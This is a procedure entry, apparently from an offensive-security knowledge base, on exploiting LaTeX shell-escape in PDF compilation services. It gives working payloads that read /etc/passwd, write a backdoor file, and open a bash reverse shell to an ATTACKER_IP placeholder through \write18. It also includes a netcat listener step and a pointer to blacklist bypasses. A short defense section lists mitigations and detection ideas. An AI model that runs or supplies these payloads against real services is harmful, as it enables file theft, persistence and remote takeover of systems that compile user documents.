---
id: 6d573b5e-1d9d-4817-b515-50105303c548
name: LaTeX-PDF-Read-Write-and-Code-Execution
type: procedure
verified: true
submitted: true
created_at: '2019-10-16T00:00:03.605592+00:00'
updated_at: '2023-05-26T00:40:06.580067+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
tags:
  - '[[tags/known vulnerability]]'
  - '[[tags/RCE]]'
commands: []
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# LaTeX-PDF-Read-Write-and-Code-Execution

## Summary

This procedure exploits vulnerabilities in LaTeX PDF processing configurations that allow shell escape or restricted shell execution, enabling attackers to read sensitive files, write arbitrary files, or execute arbitrary code on the target system. It is particularly useful against document processing applications or services that compile LaTeX documents into PDFs without proper sandboxing, such as academic publishing platforms or internal document converters.

## Description

LaTeX is a document preparation system widely used for creating PDFs from markup files. Certain configurations, such as those using the `shell-escape` or `shell-restricted` flags during PDF compilation (e.g., via `pdflatex --shell-escape`), permit the inclusion of external commands. This introduces a command injection vulnerability where specially crafted LaTeX code can read files using `\newread` and `\openin`, write files using `\newwrite` and `\openout`, or execute system commands via `\write18`. Attackers can embed these primitives in a LaTeX document and submit it to a vulnerable processor, leading to remote code execution (RCE) if the service runs with sufficient privileges. This technique targets client-side execution flaws in document viewers or server-side processing pipelines and requires no authentication beyond file upload access.

## Requirements

1. Access to a LaTeX PDF processing service or application that compiles user-submitted .tex files to PDF using `pdflatex` or similar with `shell-escape` or `shell-restricted` enabled.
2. Knowledge of target file paths for read/write operations (e.g., /etc/passwd on Linux or C:\Windows\System32\drivers\etc\hosts on Windows).
3. For code execution, a listening service on the attacker's machine (e.g., netcat on a reachable IP/port).
4. Basic LaTeX syntax understanding to embed payloads without breaking document compilation.
5. No additional tools required beyond a text editor to craft the .tex file and a way to submit it (e.g., web upload form).

## Defense

Defensive measures and detection strategies:

- Disable shell escape options in LaTeX compilers (use `pdflatex` without `--shell-escape` or `--shell-restricted`).
- Run LaTeX processing in a sandboxed environment (e.g., using Docker with restricted privileges or seccomp filters) to limit file access and command execution.
- Implement input validation and sanitization to strip or escape dangerous LaTeX commands like `\write18`, `\openin`, and `\openout`.
- Monitor for anomalous file I/O or process creation during PDF generation (e.g., via auditd on Linux or Sysmon on Windows).
- Use whitelisting for allowed LaTeX packages and commands, and scan submitted .tex files for suspicious patterns using tools like ClamAV or custom regex filters.

## Objectives

1. Read sensitive files from the target system to gather information (e.g., configuration files, credentials).
2. Write arbitrary files to the target system for persistence or further exploitation (e.g., dropping webshells or modifying configs).
3. Achieve remote code execution to establish a foothold, such as spawning a reverse shell for interactive access.
4. Expected outcome: Successful payload execution resulting in file access, modification, or command running without errors in the PDF compilation log.

## Instructions

### Step 1: Verify Vulnerability and Craft Read Payload

**Context**: Test if the LaTeX processor allows file reading by embedding a payload that opens and displays content from a known readable file, such as /etc/passwd on Linux. This step confirms the presence of the vulnerability before attempting more destructive actions.

Embed the following LaTeX code snippet using [[codes/LaTeX-File-Read-Payload]]:

```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

> This code creates a new read handle, opens the target file, reads the first line into a variable, outputs it as text in the PDF, and closes the handle. Replace /etc/passwd with the desired path (e.g., C:\Windows\System32\drivers\etc\hosts on Windows). Submit the .tex file to the processor and check the generated PDF for the file contents.

### Step 2: Craft Write Payload

**Context**: If reading succeeds, extend to writing by using a payload that creates or appends to a target file. This can be used for persistence, such as writing a new user to /etc/passwd or dropping a script.

Embed the following LaTeX code snippet using [[codes/LaTeX-File-Write-Payload]]:

```latex
\newwrite\outfile
\openout\outfile=/tmp/backdoor.txt
\write\outfile{echo 'Backdoor created'}
\closeout\outfile
```

> This code opens a write handle to the target file, writes the specified text, and closes it. Adjust the path and content as needed (ensure write permissions exist). After submission, verify on the target if the file was created/modified.

### Step 3: Prepare Execution Payload

**Context**: For code execution, select or craft a shell command payload, such as a reverse shell, and embed it using the shell escape primitive. This assumes `\write18` is permitted.

Use the following bash reverse shell code as the payload with [[codes/Bash-TCP-Reverse-Shell]]:

```bash
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
```

Embed it in LaTeX using [[codes/LaTeX-Shell-Escape-Execution]]:

```latex
\immediate\write18{bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"}
```

> Substitute $ATTACKER_IP and $ATTACKER_PORT with your listener details (e.g., start `nc -lvnp 4444` on your machine). The `\immediate\write18` command directly executes the shell payload during compilation. Submit the full .tex document containing this to the vulnerable service.

### Step 4: Submit and Validate

**Context**: Compile and submit the crafted .tex file to the target application or service (e.g., via a file upload form or API endpoint). Monitor for success indicators like incoming connections or file changes.

Create a complete .tex document incorporating one or more payloads:

```latex
\documentclass{article}
\begin{document}
% Embed payloads here
\end{document}
```

> Use a tool like Overleaf or local pdflatex for testing on your side, then upload. If blacklists block certain commands, refer to bypass techniques (e.g., encoding or alternate primitives from external resources).
